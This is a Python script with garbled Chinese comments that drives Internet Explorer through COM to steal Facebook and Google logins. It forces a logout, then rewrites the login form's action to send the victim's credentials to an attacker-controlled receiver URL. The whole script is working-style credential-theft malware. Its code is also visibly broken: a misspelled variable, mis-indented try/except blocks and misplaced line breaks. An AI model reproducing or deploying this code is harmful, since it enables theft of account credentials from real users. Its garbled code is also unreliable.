#!/usr/bin/python
#-*- coding:utf-8 -*-

import win32com.client
import time
import urlparse
import urllib

#���ܱ��ķ����������޸�
data_receiver = "http://localhost:8080/"

#��Ҫ��ȡ����վ�ֵ�
target_sites  = {}
#������վ��Ϣ
arget_sites["www.facebook.com"] =
              {"logout_url"      : None,
               "logout_form"     : "logout_form",
               "login_form_index": 0,
               "owned"           : False}
target_sites["accounts.google.com"]  =
              {"logout_url"       : "https://accounts.google.com/\
                                    Logout?hl=en&continue=https://accounts.google.com/\
                                    ServiceLogin%3Fservice%3Dmail",
               "logout_form"      : None,
               "login_form_index" : 0,
               "owned"            : False}

target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

#IE��id
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
#����COM����ʵ��������ͨ���ö������������������еı�ǩ��ʵ��
windows = win32com.client.Dispatch(clsid)

#�ȴ������������ҳ��
def wait_for_browser(browser):
    #��û�����꣬������ѭ��
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

while True:
    #������ǩҳ
    for browser in windows:
        #��ȡ�����������ҳ��ʹ��urlparse������ַ���
        url = urlparse.urlparse(browser.LocationUrl)
        #������������ֵ��key
        if url.hostname in target_sites:
            #�Ƿ��Ѿ����й�����continue������һѭ��
            if target_sites[url.hostname]["owned"]:
                continue
            #������ύlogout���������ض���ǳ�
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                #��ȡ����DOM����
                full_doc = browser.Document.all
                for i in full_doc:
                    try:
                        #�����Ԫ��idΪlogout_form�����ύǿ�Ƶǳ�
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                                wait_for_browser(browser)
                        except:
                            pass

            try:
                #�����޸ĵ�¼����login_indexΪ��¼����COM�����е����λ��
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                #�޸�action����·��
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass
time.sleep(5)
